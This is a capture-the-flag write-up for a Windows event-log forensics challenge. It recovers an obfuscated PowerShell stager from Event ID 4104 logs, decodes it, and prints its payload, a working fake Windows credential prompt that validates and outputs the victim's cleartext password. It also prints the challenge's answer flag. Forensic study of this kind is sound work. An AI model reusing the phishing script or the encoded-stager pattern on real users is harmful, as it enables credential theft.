

## Challenge Summary

* **Category:** DFIR / Windows Event Log Analysis (Credential Access)
* **Goal:** Identify a staged PowerShell credential-phishing chain inside a Windows event log (`.evtx`), extract the obfuscated stage-1 payload, and recover the specific function name and stage-2 placeholder token.
* **Flag Format:** `grodno{function_marker}`

---

## Step-by-Step Walkthrough

### 1. Identifying the Relevant Log Source

Given the repository of EVTX attack samples, the threat behavior targets standard Windows PowerShell logging. In modern Windows environments, script blocks executed by PowerShell are logged inside the **Microsoft-Windows-PowerShell/Operational** log under **Event ID 4104 (Script Block Logging)**.

Reviewing the `Credential Access` directory explicitly points to this target:

```bash
ls 'Credential Access' | grep "4104"
# Output: phish_windows_credentials_powershell_scriptblockLog_4104.evtx

```

### 2. Extracting the Event Data

Because `.evtx` files are saved in a binary format, we extract the log entries into an inspection-friendly structure (like XML or JSON). Using a Python script leveraging the `PyEvtxParser` library allows us to quickly search for records containing `ScriptBlockText` data blocks:

```python
from evtx import PyEvtxParser
parser = PyEvtxParser('Credential Access/phish_windows_credentials_powershell_scriptblockLog_4104.evtx')

for record in parser.records():
    if 'ScriptBlockText' in record['data']:
        print(record['data'])

```

This dumps the full XML log entry, revealing an inline PowerShell stager utilizing base64-encoded, Gzip-compressed injection:

```xml
<Data Name="ScriptBlockText">&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAAlVdl0CA81UXW...'))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))</Data>

```

### 3. De-obfuscating Stage 1

The script block extracts a raw payload out of a Base64 blob, pipes it through a Gzip decompressor stream, and executes it on the fly using `[scriptblock]::create()`.

To view the inner script logic, we replicate the extraction protocol directly via a quick Python snippet using the `gzip` and `base64` modules:

```python
import base64, gzip

b64_payload = 'H4sIAAlVdl0CA81UXW/aMBR996+4svJANJIfgNQHBNs6aaWIsO2hnSbXuaVeEzuyHdKI8d93YwIDTUJlfVkeLPme+3F87lEeay29Mho+6bV5xuSzWSk9t6as/IZF0mIOVxBdG+fTWqU74IOxEwJQeyWKAf+mdG4aBxnK2irf8iHweYHCIVAKWqgdHfJQ4bqECPV61AG5KYXS94e7FiXyIecxi/ZXYsBPcRbtyk6QXYiwx7ooAtJH4B3w+3BGRx0q4VxjbHhfRy79iH6GnkLPR6+L030eG+d5smwrhIQiWD4UbSCXtc5jmU6VRemNbTO0ayXRpWMpTa39jdBihSX1Y9E0o2kzbJLbh5+UfUEtSa+0VJUoJoZEffGDuwuK+5qO/ffR6EbIJ6UxZs2TKnBArNKvolC58Pjn5W7Ag5C0i4NUPIZEI0RLW2O8YUDfv1uEDNcNhaORQ+h9420LYtXt7nVWCUzO2CXgZywT8FfZJmRebJ2u6u32CbP/Mwv1nM4aCE4c9AtM7RNNSCjeMogoUNW+U1NjszfUGWGph8OCKCdmJ8IX2s+M1BzCNOyOjHSQvu/OYLHJluPF8sd8cTt5n2VbtmV///R+A6HMO3IQBQAA'

decompressed = gzip.decompress(base64.b64decode(b64_payload))
print(decompressed.decode('utf-8'))

```

### 4. Code Analysis & Artifact Recovery

Running the de-obfuscation script yields the cleartext PowerShell script below:

```powershell
function Invoke-LoginPrompt{
$cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")
$username = "$env:username"
$domain = "$env:userdomain"
$full = "$domain" + "\" + "$username"
$password = $cred.GetNetworkCredential().password
Add-Type -assemblyname System.DirectoryServices.AccountManagement
$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
while($DS.ValidateCredentials("$full","$password") -ne $True){
    $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
    $username = "$env:username"
    $domain = "$env:userdomain"
    $full = "$domain" + "\" + "$username"
    $password = $cred.GetNetworkCredential().password
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $DS.ValidateCredentials("$full", "$password") | out-null
    }
 $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
 $output
 R{START_PROCESS}
}
Invoke-LoginPrompt

```

Inspecting the payload allows us to capture the two specific variables needed for the flag format:

1. **The Function Name:** Defined on line 1 as `Invoke-LoginPrompt`.
2. **The Placeholder Marker:** Located at the end of the validation block right before the closing bracket: `R{START_PROCESS}`.

---

## Final Flag

`grodno{Invoke-LoginPrompt_R{START_PROCESS}}`